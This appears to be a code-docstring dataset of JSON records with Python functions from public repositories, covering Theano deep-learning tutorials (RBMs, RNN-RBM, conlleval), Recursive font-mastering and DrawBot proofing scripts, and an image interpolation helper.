{"docstring": "'''\nINPUT:\np :: predictions\ng :: groundtruth\nw :: corresponding words\n\nOUTPUT:\nfilename :: name of the file where the predictions\nare written. it will be the input of conlleval.pl script\nfor computing the performance in terms of precision\nrecall and f1 score\n\nOTHER:\nscript_path :: path to the directory containing the\nconlleval.pl script\n'''\n", "func_signal": "def conlleval(p, g, w, filename, script_path):\n", "code": "out = ''\nfor sl, sp, sw in zip(g, p, w):\n    out += 'BOS O O\\n'\n    for wl, wp, w in zip(sl, sp, sw):\n        out += w + ' ' + wl + ' ' + wp + '\\n'\n    out += 'EOS O O\\n\\n'\n\nf = open(filename, 'w')\nf.writelines(out)\nf.close()\n\nreturn get_perf(filename, script_path)", "path": "DeepLearningTutorials/code/rnnslu.py", "commit_date": "2018-03-08 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "\"\"\"Stochastic approximation to the pseudo-likelihood\"\"\"\n\n# index of bit i in expression p(x_i | x_{\\i})\n", "func_signal": "def get_pseudo_likelihood_cost(self, updates):\n", "code": "bit_i_idx = theano.shared(value=0, name='bit_i_idx')\n\n# binarize the input image by rounding to nearest integer\nxi = T.round(self.input)\n\n# calculate free energy for the given bit configuration\nfe_xi = self.free_energy(xi)\n\n# flip bit x_i of matrix xi and preserve all other bits x_{\\i}\n# Equivalent to xi[:,bit_i_idx] = 1-xi[:, bit_i_idx], but assigns\n# the result to xi_flip, instead of working in place on xi.\nxi_flip = T.set_subtensor(xi[:, bit_i_idx], 1 - xi[:, bit_i_idx])\n\n# calculate free energy with bit flipped\nfe_xi_flip = self.free_energy(xi_flip)\n\n# equivalent to e^(-FE(x_i)) / (e^(-FE(x_i)) + e^(-FE(x_{\\i})))\ncost = T.mean(self.n_visible * T.log(T.nnet.sigmoid(fe_xi_flip -\n                                                    fe_xi)))\n\n# increment bit_i_idx % number as part of updates\nupdates[bit_i_idx] = (bit_i_idx + 1) % self.n_visible\n\nreturn cost", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''Construct a symbolic RNN-RBM and initialize parameters.\n\nn_visible : integer\n    Number of visible units.\nn_hidden : integer\n    Number of hidden units of the conditional RBMs.\nn_hidden_recurrent : integer\n    Number of hidden units of the RNN.\n\nReturn a (v, v_sample, cost, monitor, params, updates_train, v_t,\nupdates_generate) tuple:\n\nv : Theano matrix\n    Symbolic variable holding an input sequence (used during training)\nv_sample : Theano matrix\n    Symbolic variable holding the negative particles for CD log-likelihood\n    gradient estimation (used during training)\ncost : Theano scalar\n    Expression whose gradient (considering v_sample constant) corresponds\n    to the LL gradient of the RNN-RBM (used during training)\nmonitor : Theano scalar\n    Frame-level pseudo-likelihood (useful for monitoring during training)\nparams : tuple of Theano shared variables\n    The parameters of the model to be optimized during training.\nupdates_train : dictionary of Theano variable -> Theano variable\n    Update object that should be passed to theano.function when compiling\n    the training function.\nv_t : Theano matrix\n    Symbolic variable holding a generated sequence (used during sampling)\nupdates_generate : dictionary of Theano variable -> Theano variable\n    Update object that should be passed to theano.function when compiling\n    the generation function.'''\n\n", "func_signal": "def build_rnnrbm(n_visible, n_hidden, n_hidden_recurrent):\n", "code": "W = shared_normal(n_visible, n_hidden, 0.01)\nbv = shared_zeros(n_visible)\nbh = shared_zeros(n_hidden)\nWuh = shared_normal(n_hidden_recurrent, n_hidden, 0.0001)\nWuv = shared_normal(n_hidden_recurrent, n_visible, 0.0001)\nWvu = shared_normal(n_visible, n_hidden_recurrent, 0.0001)\nWuu = shared_normal(n_hidden_recurrent, n_hidden_recurrent, 0.0001)\nbu = shared_zeros(n_hidden_recurrent)\n\nparams = W, bv, bh, Wuh, Wuv, Wvu, Wuu, bu  # learned parameters as shared\n                                            # variables\n\nv = T.matrix()  # a training sequence\nu0 = T.zeros((n_hidden_recurrent,))  # initial value for the RNN hidden\n                                     # units\n\n# If `v_t` is given, deterministic recurrence to compute the variable\n# biases bv_t, bh_t at each time step. If `v_t` is None, same recurrence\n# but with a separate Gibbs chain at each time step to sample (generate)\n# from the RNN-RBM. The resulting sample v_t is returned in order to be\n# passed down to the sequence history.\ndef recurrence(v_t, u_tm1):\n    bv_t = bv + T.dot(u_tm1, Wuv)\n    bh_t = bh + T.dot(u_tm1, Wuh)\n    generate = v_t is None\n    if generate:\n        v_t, _, _, updates = build_rbm(T.zeros((n_visible,)), W, bv_t,\n                                       bh_t, k=25)\n    u_t = T.tanh(bu + T.dot(v_t, Wvu) + T.dot(u_tm1, Wuu))\n    return ([v_t, u_t], updates) if generate else [u_t, bv_t, bh_t]\n\n# For training, the deterministic recurrence is used to compute all the\n# {bv_t, bh_t, 1 <= t <= T} given v. Conditional RBMs can then be trained\n# in batches using those parameters.\n(u_t, bv_t, bh_t), updates_train = theano.scan(\n    lambda v_t, u_tm1, *_: recurrence(v_t, u_tm1),\n    sequences=v, outputs_info=[u0, None, None], non_sequences=params)\nv_sample, cost, monitor, updates_rbm = build_rbm(v, W, bv_t[:], bh_t[:],\n                                                 k=15)\nupdates_train.update(updates_rbm)\n\n# symbolic loop for sequence generation\n(v_t, u_t), updates_generate = theano.scan(\n    lambda u_tm1, *_: recurrence(None, u_tm1),\n    outputs_info=[None, u0], non_sequences=params, n_steps=200)\n\nreturn (v, v_sample, cost, monitor, params, updates_train, v_t,\n        updates_generate)", "path": "DeepLearningTutorials/code/rnnrbm.py", "commit_date": "2018-01-19 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "\"\"\"Approximation to the reconstruction error\n\nNote that this function requires the pre-sigmoid activation as\ninput.  To understand why this is so you need to understand a\nbit about how Theano works. Whenever you compile a Theano\nfunction, the computational graph that you pass as input gets\noptimized for speed and stability.  This is done by changing\nseveral parts of the subgraphs with others.  One such\noptimization expresses terms of the form log(sigmoid(x)) in\nterms of softplus.  We need this optimization for the\ncross-entropy since sigmoid of numbers larger than 30. (or\neven less then that) turn to 1. and numbers smaller than\n-30. turn to 0 which in terms will force theano to compute\nlog(0) and therefore we will get either -inf or NaN as\ncost. If the value is expressed in terms of softplus we do not\nget this undesirable behaviour. This optimization usually\nworks fine, but here we have a special case. The sigmoid is\napplied inside the scan op, while the log is\noutside. Therefore Theano will only see log(scan(..)) instead\nof log(sigmoid(..)) and will not apply the wanted\noptimization. We can not go and replace the sigmoid in scan\nwith something else also, because this only needs to be done\non the last step. Therefore the easiest and more efficient way\nis to get also the pre-sigmoid activation as an output of\nscan, and apply both the log and sigmoid outside scan such\nthat Theano can catch and optimize the expression.\n\n\"\"\"\n\n", "func_signal": "def get_reconstruction_cost(self, updates, pre_sigmoid_nv):\n", "code": "cross_entropy = T.mean(\n    T.sum(\n        self.input * T.log(T.nnet.sigmoid(pre_sigmoid_nv)) +\n        (1 - self.input) * T.log(1 - T.nnet.sigmoid(pre_sigmoid_nv)),\n        axis=1\n    )\n)\n\nreturn cross_entropy", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''\nwin :: int corresponding to the size of the window\ngiven a list of indexes composing a sentence\n\nl :: array containing the word indexes\n\nit will return a list of list of indexes corresponding\nto context windows surrounding each word in the sentence\n'''\n", "func_signal": "def contextwin(l, win):\n", "code": "assert (win % 2) == 1\nassert win >= 1\nl = list(l)\n\nlpadded = win // 2 * [-1] + l + win // 2 * [-1]\nout = [lpadded[i:(i + win)] for i in range(len(l))]\n\nassert len(out) == len(l)\nreturn out", "path": "DeepLearningTutorials/code/rnnslu.py", "commit_date": "2018-03-08 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "''' This function implements one step of Gibbs sampling,\n    starting from the visible state'''\n", "func_signal": "def gibbs_vhv(self, v0_sample):\n", "code": "pre_sigmoid_h1, h1_mean, h1_sample = self.sample_h_given_v(v0_sample)\npre_sigmoid_v1, v1_mean, v1_sample = self.sample_v_given_h(h1_sample)\nreturn [pre_sigmoid_h1, h1_mean, h1_sample,\n        pre_sigmoid_v1, v1_mean, v1_sample]", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "\"\"\"\nSplits a path into all it's parts, returns a list.\n\n*path* is the path to split\n\"\"\"\n", "func_signal": "def splitall(path):\n", "code": "allparts = []\nwhile 1:\n    parts = os.path.split(path)\n    if parts[0] == path:  # sentinel for absolute paths\n        allparts.insert(0, parts[0])\n        break\n    elif parts[1] == path: # sentinel for relative paths\n        allparts.insert(0, parts[1])\n        break\n    else:\n        path = parts[0]\n        allparts.insert(0, parts[1])\nreturn allparts", "path": "recursive/mastering/utils.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "'''\nMake a temporary font file with unique PS name, because the same PS name\nimplies that the same font is seen throughout the PDF\n'''\n", "func_signal": "def make_temp_font(timestamp, font_file):\n", "code": "ttf = TTFont(os.path.abspath(font_file))\nfont_dir = os.path.dirname(font_file)\ntemp_font_name = os.path.splitext(os.path.basename(font_file))[0]\ntempName6 = f\"tempFont-{timestamp}\"\ntemp_font_file = os.path.join(font_dir, f\"{tempName6}.ttf\")\nttf[\"name\"].setName(tempName6, nameID=6, platformID=1, platEncID=0, langID=0)\nttf[\"name\"].setName(tempName6, nameID=1, platformID=1, platEncID=0, langID=0)\nttf[\"name\"].setName(tempName6, nameID=4, platformID=1, platEncID=0, langID=0)\nttf[\"name\"].setName(tempName6, nameID=16, platformID=1, platEncID=0, langID=0)\noldName3 = ttf['name'].getName(3, 3, 1)\ntempName3 = str(oldName3).replace(str(oldName3).split(';')[-1],tempName6)\nttf[\"name\"].setName(tempName6, nameID=3, platformID=1, platEncID=0, langID=0)\nttf.save(temp_font_file)\nreturn(temp_font_file)", "path": "recursive/src/proofs/drawbot-proofing/vietnamese-diacritics/recursive-vietnamese-diacritics-sep_23_2019.drawbot.py", "commit_date": "2019-10-08 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# curve = ((0,0), (W*curviness, 0), (W-(W*curviness),H), (W,H)) # fast to slow to fast (not sure?)\n", "func_signal": "def getCurveValue(t, curviness, axMin, axMax, loop=\"loop\"):\n", "code": "curve = ((0,0), (0, H*curviness), (W,H-(H*curviness)), (W,H)) # slow to fast to slow, based on x over time (bell curve)\n# curve = ((0, 20), (-2689.98, 30), (-2000,H), (W,H))\nsplit = splitCubicAtT(*curve, t)\nx, y = split[0][-1]\n# Scale the y value to the range of 0 and 1, assuming it was in a range of 0 to 1000\n# f = y / H # for some reason, y isn't working as well for me as x to attain different curves...\nf = x / W\n\n# go up with curve for first half, then back down\nif loop is \"loop\":\n    if t <= 0.5:\n        f *= 2\n    else:\n        f = 1 - (f - 0.5) * 2\n        \nvalue = interpolate(axMin, axMax, f)\n        \nreturn value, x, y", "path": "recursive/src/proofs/drawbot-specimens-and-diagrams/flipbook/recursive-flipbook-wave_viz-multistage-simplified-081319.drawbot.py", "commit_date": "2019-10-08 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"Sets the bit6 macOS overlap rendering bit.\"\"\"\n", "func_signal": "def set_mac_overlap_rendering_bit(font):\n", "code": "glyf = font[\"glyf\"]\nfor glyph_name in glyf.keys():\n    glyph = glyf[glyph_name]\n    # Only needs to be set for glyphs with contours\n    if glyph.numberOfContours > 0:\n        glyph.flags[0] |= MAC_OVERLAP_RENDERING_BIT\nreturn font", "path": "recursive/src/build-scripts/instancing/vf2s.py", "commit_date": "2019-11-27 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nWalks down all directories starting at *path* looking for files\nending with *extension*. Knows that UFOs are directories and stops\nthe walk for any found UFO.\n\"\"\"\n", "func_signal": "def getFiles(path, extension):\n", "code": "if not extension.startswith('.'):\n    extension = '.' + extension\nif extension == '.ufo':\n    return [dir for (dir, dirs, files) in os.walk(path)\n            if dir[-len(extension):] == extension]\nelse:\n    return [os.sep.join((dir, file)) for (dir, dirs, files)\n            in os.walk(path) for file in files if\n            file[-len(extension):] == extension]", "path": "recursive/mastering/utils.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# top, right, bottom, left\n# margins = (0.75, 0.25, 0.25, 0.25)\n", "func_signal": "def drawMargins():\n", "code": "margins = (0.75, 0.3, 0.2, 0.3)\nthickness = 1\nfill(0,1,1)\n\n# x, y, w, h\nrect(0, H - margins[0]*DPI, W, thickness)  # top\nrect(W - margins[1]*DPI, 0, thickness, H)      # right\nrect(0, margins[2]*DPI, W, thickness)  # bottom\nrect(margins[3]*DPI, 0, thickness, H)      # left\n\nfill(0,1,1,0.5)\nrect(0, H*0.5, W, thickness)      # middle\nrect(W*0.5, 0, thickness, H)      # center", "path": "recursive/src/proofs/drawbot-specimens-and-diagrams/flipbook/recursive-flipbook-wave_viz-multistage-simplified-081319.drawbot.py", "commit_date": "2019-10-08 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nIterates through all glyphs of the given fonts and finds the max and min\nbounding boxes for the set of fonts. Returns the min and max values.\n\"\"\"\n", "func_signal": "def find_min_max(fonts):\n", "code": "min = 0\nmax = 0\n\nfor font in fonts:\n    for glyph in font:\n        if glyph.bounds is not None:\n            if glyph.bounds[1] < min:\n                min = glyph.bounds[1]\n            if glyph.bounds[3] > max:\n                max = glyph.bounds[3]\n\nreturn min, max", "path": "recursive/mastering/data/set_vertical_metrics.py", "commit_date": "2019-10-25 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# source font (font1)\n", "func_signal": "def calcNewSize(targetFontName, targetFontSize):\n", "code": "fontSize(fontSize1)\nfont(fontName1)\nxHeight1 = fontXHeight()\nprint(fontXHeight())\n\n# target font\nfontSize(targetFontSize)\nfont(targetFontName)\nxHeight2 = fontXHeight()\n\nreturn targetFontSize * (xHeight1 / xHeight2)", "path": "recursive/src/proofs/drawbot-proofing/comparing_masters/comparing_fonts-basic.drawbot.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# curve = ((0,0), (W*curviness, 0), (W-(W*curviness),H), (W,H)) # fast to slow to fast (not sure?)\n", "func_signal": "def getCurveValue(t, curviness, axMin, axMax, loop=\"loop\"):\n", "code": "curve = ((0,0), (0, H*curviness), (W,H-(H*curviness)), (W,H)) # slow to fast to slow, based on x over time (bell curve)\n# curve = ((0, 20), (-2689.98, 30), (-2000,H), (W,H))\nsplit = splitCubicAtT(*curve, t)\nx, y = split[0][-1]\n# Scale the y value to the range of 0 and 1, assuming it was in a range of 0 to 1000\n# f = y / H # for some reason, y isn't working as well for me as x to attain different curves...\nf = x / W\n\n# go up with curve for first half, then back down\nif loop is \"loop\":\n    if t <= 0.5:\n        f *= 2\n    else:\n        f = 1 - (f - 0.5) * 2\n        \nvalue = interpolate(axMin, axMax, f)\n        \nreturn value, x, y", "path": "recursive/src/proofs/drawbot-specimens-and-diagrams/flipbook/in-process-versions/basic-multi-multipart-easing-curves.drawbot.py", "commit_date": "2019-10-08 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nMakes WOFF2 files from list of paths.\n\n*files* is a `list` of file paths as `string`\n*destination* is a `string` of the destination to save the WOFF files.\n\"\"\"\n", "func_signal": "def makeWOFF(files, destination):\n", "code": "from fontTools.ttLib import woff2\nfrom fontTools.ttx import makeOutputFileName\n\nif not os.path.exists(destination):\n    os.mkdir(destination)\n\nprint(\"\ud83c\udfd7  Making WOFF2\")\nprintProgressBar(0, len(files), prefix='  ', suffix='Complete', length=50)\nfor i, file in enumerate(files):\n    outfilename = makeOutputFileName(file,\n                                     outputDir=destination,\n                                     extension='.woff2')\n    if os.path.exists(outfilename):\n        os.remove(outfilename)\n\n    woff2.compress(file, outfilename)\n    printProgressBar(i + 1, len(files), prefix='  ',\n                     suffix='Complete', length=50)", "path": "recursive/mastering/utils.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# if g.unicodes == ():\n", "func_signal": "def addUnicodeForTrickyGlyphs(g):\n", "code": "if g.unicodes != unicodeNameMatches.get(g.name, \"unicode\"):\n    uni = unicodeNameMatches.get(g.name, \"unicode\")\n    \n    if uni != \"unicode\":\n        print(g.name, uni)\n        g.unicode = uni", "path": "recursive/src/00-recursive-scripts-for-robofont/clean-up/add-unicodes-from-adobe_glyph_list.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nReplaces the features.fea file in the UFO with the external\nfeatures.fea file\n\n*src* is the source directory with the UFOs and external features.fea file\n\"\"\"\n", "func_signal": "def buildFeatures(src):\n", "code": "ufos = getFiles(src, \"ufo\")\nfeature = os.path.join(src, \"features.fea\")\nfor ufo in ufos:\n    shutil.copy(feature, ufo)\nprint(\"\ud83c\udfd7  Moved features into UFOs\")", "path": "recursive/mastering/build_variable.py", "commit_date": "2020-08-14 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# let user select masterToSendTo\n", "func_signal": "def getMasterToSendTo():\n", "code": "masterToSendToPath = getFile(\n    \"MOVE INTO\")\n\nif \"mono\" in masterToSendToPath[0].lower():\n    print(\"error: you are trying to copy into a mono font\")\n    exit()\n\nmasterToSendTo = OpenFont(masterToSendToPath)[0]\n\nmasterToSendToName = masterToSendTo.info.familyName + \\\n    \" \" + masterToSendTo.info.styleName\n\nreturn masterToSendTo, masterToSendToName", "path": "recursive/src/00-recursive-scripts-for-robofont/uniting-mono-and-sans/copy-normal-width-glyphs-mono_to_sans.py", "commit_date": "2019-11-17 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nSets the vertical metrics and the USE_TYPO_VALUES bit in all the\nopen fonts.\n\nSaves and closes each font when it is finished.\n\"\"\"\n\n", "func_signal": "def set_vertical_metrics(fonts, max, min, asc, dsc):\n", "code": "print('Setting fonts to:')\nprint('winAscent: ' + str(max))\nprint('winDescent: ' + str(abs(min)))\nprint('typoAscender & hheaAscender: ' + str(asc))\nprint('typoDescender & hheaDescender: ' + str(dsc))\nprint('typoLineGap & hheaLineGap: 0')\nfor font in fonts:\n    font.info.openTypeHheaAscender = asc\n    font.info.openTypeHheaDescender = dsc\n    font.info.openTypeHheaLineGap = 0\n    font.info.openTypeOS2TypoAscender = asc\n    font.info.openTypeOS2TypoDescender = dsc\n    font.info.openTypeOS2TypoLineGap = 0\n    font.info.openTypeOS2WinAscent = max\n    font.info.openTypeOS2WinDescent = abs(min)\n    if font.info.openTypeOS2Selection is None or 7 not in font.info.openTypeOS2Selection:\n        if font.info.openTypeOS2Selection is None:\n            font.info.openTypeOS2Selection = [7]\n        else:\n            font.info.openTypeOS2Selection.append(7)\n    font.save()\n    font.close()", "path": "recursive/mastering/data/set_vertical_metrics.py", "commit_date": "2019-10-25 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# the new default is at the end, so this will re-apply a \"smart sort\" to the font\n", "func_signal": "def sortFont(font):\n", "code": "newGlyphOrder = font.naked().unicodeData.sortGlyphNames(font.glyphOrder, sortDescriptors=[dict(type=\"cannedDesign\", ascending=True, allowPseudoUnicode=True)])\nfont.glyphOrder = newGlyphOrder", "path": "recursive/src/00-recursive-scripts-for-robofont/clean-up/add-unicodes-from-adobe_glyph_list.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nLooks at all standard single accented captial letters (see list) to find\nthe tallest value for the hheaAscender and typoAscender values. Likewise,\nlooks at all lowercase letters that descend (see list) to find the value\nfor hheaDescender and typoDescender. Returns the descender and ascender\nvalues.\n\"\"\"\n\n", "func_signal": "def find_typo_values(fonts):\n", "code": "ascender = ['Agrave', 'Aacute', 'Acircumflex', 'Atilde', 'Adieresis',\n            'Aring', 'Amacron', 'Abreve', 'Cacute', 'Ccircumflex',\n            'Cdotaccent', 'Ccaron', 'Dcaron', 'Egrave', 'Eacute',\n            'Ecircumflex', 'Edieresis', 'Emacron', 'Ebreve', 'Edotaccent',\n            'Eogonek', 'Ecaron', 'Etilde', 'Gcircumflex', 'Gbreve',\n            'Gdotaccent', 'Gcaron', 'Hcircumflex', 'Igrave', 'Iacute',\n            'Icircumflex', 'Idieresis', 'Itilde', 'Imacron', 'Ibreve',\n            'Idotaccent', 'Jcircumflex', 'Lacute', 'Ntilde', 'Nacute',\n            'Ncaron', 'Ograve', 'Oacute', 'Ocircumflex', 'Otilde',\n            'Odieresis', 'Omacron', 'Obreve', 'Ohungarumlaut', 'Racute',\n            'Rcaron', 'Sacute', 'Scircumflex', 'Scaron', 'Tcaron',\n            'Ugrave', 'Uacute', 'Ucircumflex', 'Udieresis', 'Utilde',\n            'Umacron', 'Ubreve', 'Uring', 'Uhungarumlaut', 'Wcircumflex',\n            'Wgrave', 'Wacute', 'Wdieresis', 'Yacute', 'Ycircumflex',\n            'Ydieresis', 'Ymacron', 'Ygrave', 'Ytilde', 'Zacute',\n            'Zdotaccent', 'Zcaron', 'AEacute']\ndescender = ['g', 'q', 'p', 'y', 'j']\nasc = 0\ndsc = 0\nfor font in fonts:\n    for name in ascender:\n        if name in font.keys():\n            glyph = font[name]\n            if glyph.bounds[3] > asc:\n                asc = glyph.bounds[3]\n    for name in descender:\n        if name in font.keys():\n            glyph = font[name]\n            if glyph.bounds[1] < dsc:\n                dsc = glyph.bounds[1]\nreturn dsc, asc", "path": "recursive/mastering/data/set_vertical_metrics.py", "commit_date": "2019-10-25 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\n\tUse to split Recursive VF into an arbitrary number of instances, so that each style is slightly different from the previous one.\n\n\tUSAGE: On the command line, install dependencies with a virtual environment and pip, then run a command like:\n\t\n\tpython src/proofs/final-specimen/create-instance-per-page.py -f fonts_1.031/Variable_TTF/Recursive_VF_1.031.ttf -s 57 -r\n\n\tOutputs to \"recursive-split\" directory by default.\n\"\"\"\n\n", "func_signal": "def splitFont(splits=10, fontPath=\"fonts_1.031/Variable_TTF/Recursive_VF_1.031.ttf\", outputDirectoryyyy=\"recursive-split\", run=False):\n", "code": "report = \"\"\n\nif run:\n\tif os.path.exists(outputDirectoryyyy):\n\t\tshutil.rmtree(outputDirectoryyyy)\n\tif not os.path.exists(outputDirectoryyyy):\n\t\tos.makedirs(outputDirectoryyyy)\t\n\nvarfont = ttLib.TTFont(fontPath)\n\nfor split in range(0,splits):\n\tt = split / (splits -1)\n\tmono = round(interpolate(axes['mono'][0], axes['mono'][1], t), 2)\n\tcasl = round(interpolate(axes['casl'][0], axes['casl'][1], t), 2)\n\twght = round(interpolate(axes['wght'][0], axes['wght'][1], t), 2)\n\tslnt = round(interpolate(axes['slnt'][0], axes['slnt'][1], t), 2)\n\tital = 0.5\n\n\tpageNum = str(split + 1).rjust(2, '0')\n\tmonoVal = \"{:.2f}\".format(mono).rjust(7, ' ')\n\tcaslVal = \"{:.2f}\".format(casl).rjust(7, ' ')\n\twghtVal = \"{:.2f}\".format(wght).rjust(7, ' ')\n\tslntVal = \"{:.2f}\".format(slnt).rjust(7, ' ')\n\titalVal = \"{:.2f}\".format(ital).rjust(7, ' ')\n\n\toutput = f\"page {pageNum} | MONO: {monoVal}, CASL: {caslVal}, wght: {wghtVal}, slnt: {slntVal}, ital: {italVal}\"\n\tprint(\"\\n\", output)\n\treport += output + \"\\n\"\n\n\t# actually create the instance\n\tif run:\n\n\t\tinstance = instancer.instantiateVariableFont(\n\t\t\tvarfont, {\"wght\": wght, \"CASL\": casl, \"MONO\": mono, \"slnt\": slnt}\n\t\t)\n\n\t\t# give instance page-based style name\n\t\tsetFontNameID(instance, 1, f\"Recursive {splits}p\")\n\t\tsetFontNameID(instance, 3, f\"1.031;ARRW;RecVarSplit-split{pageNum}\")\n\t\tsetFontNameID(instance, 4, f\"Recursive {splits}p\")\n\t\tsetFontNameID(instance, 6, f\"RecVarSplit-split{pageNum}\")\n\t\tsetFontNameID(instance, 16, f\"Recursive {splits}p\")\n\t\tsetFontNameID(instance, 17, f\"Split_{pageNum}\")\n\n\t\t# save custom instance\n\t\tinstance.save(f\"{outputDirectoryyyy}/recursive-split--page_{pageNum}--MONO{mono}_CASL{casl}_wght{wght}_slnt{slnt}.ttf\")\n\nif run:\n\twith open(f\"{outputDirectoryyyy}/font-split-report.txt\", \"w\") as file:  \n\t\tfile.write(report)\n\nif not run:\n\tprint(\"\\n\\tINFO: This was a dry run to preview output. To generate fonts, please add argument --run or -r\\n\\n\")", "path": "recursive/src/proofs/final-specimen/create-instance-per-page.py", "commit_date": "2020-01-20 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# textColumnWidth += textColumnWidth * (1 - t)\n", "func_signal": "def calcFontSize(currentLetters, t):\n", "code": "currentSize = textColumnWidth / currentLetters / 0.6 \nreturn currentSize", "path": "recursive/src/proofs/drawbot-specimens-and-diagrams/drawbot-specimen--monospace_columns/recursive-specimen-two_col.drawbot.py", "commit_date": "2019-10-08 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# let user select masterToCopyFrom\n", "func_signal": "def getMasterToCopyFrom():\n", "code": "masterToCopyFromPath = getFile(\n    \"COPY FROM\")\n\nif \"sans\" in masterToCopyFromPath[0].lower():\n    print(\"error: you are trying to copy from a sans font\")\n    exit()\n\nmasterToCopyFrom = OpenFont(masterToCopyFromPath)[0]\n\nreturn masterToCopyFrom", "path": "recursive/src/00-recursive-scripts-for-robofont/uniting-mono-and-sans/copy-normal-width-glyphs-mono_to_sans.py", "commit_date": "2019-11-17 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "# top, right, bottom, left\n", "func_signal": "def drawMargins():\n", "code": "margins = (0.75, 0.3, 0.3, 0.3)\nthickness = 1\nfill(0,1,1)\n\n# x, y, w, h\nrect(0, H - margins[0]*DPI, W, thickness)  # top\nrect(margins[1]*DPI, 0, thickness, H)      # right\nrect(W - margins[2]*DPI, 0, thickness, H)  # bottom\nrect(0, margins[3]*DPI, W, thickness)      # left", "path": "recursive/src/proofs/drawbot-specimens-and-diagrams/flipbook/in-process-versions/basic-multi-multipart-easing-curves.drawbot.py", "commit_date": "2019-10-08 00:00:00", "repo_name": "arrowtype/recursive", "stars": 3037, "license": "ofl-1.1", "language": "python", "size": 1749266}
{"docstring": "\"\"\"\nhttps://stackoverflow.com/questions/12729228/simple-efficient-bilinear-interpolation-of-images-in-numpy-and-python\n\"\"\"\n", "func_signal": "def bilinear_interpolate(img, x, y):\n", "code": "x0 = np.floor(x).astype(np.int32)\nx1 = x0 + 1\ny0 = np.floor(y).astype(np.int32)\ny1 = y0 + 1\n\nx0 = np.clip(x0, 0, img.shape[1] - 1)\nx1 = np.clip(x1, 0, img.shape[1] - 1)\ny0 = np.clip(y0, 0, img.shape[0] - 1)\ny1 = np.clip(y1, 0, img.shape[0] - 1)\n\ni_a = img[y0, x0]\ni_b = img[y1, x0]\ni_c = img[y0, x1]\ni_d = img[y1, x1]\n\nwa = (x1 - x) * (y1 - y)\nwb = (x1 - x) * (y - y0)\nwc = (x - x0) * (y1 - y)\nwd = (x - x0) * (y - y0)\n\nreturn wa[..., np.newaxis] * i_a + wb[..., np.newaxis] * i_b + wc[..., np.newaxis] * i_c + wd[..., np.newaxis] * i_d", "path": "3DDFA_V2/utils/uv.py", "commit_date": "2020-10-02 00:00:00", "repo_name": "cleardusk/3DDFA_V2", "stars": 2749, "license": "mit", "language": "python", "size": 76579}
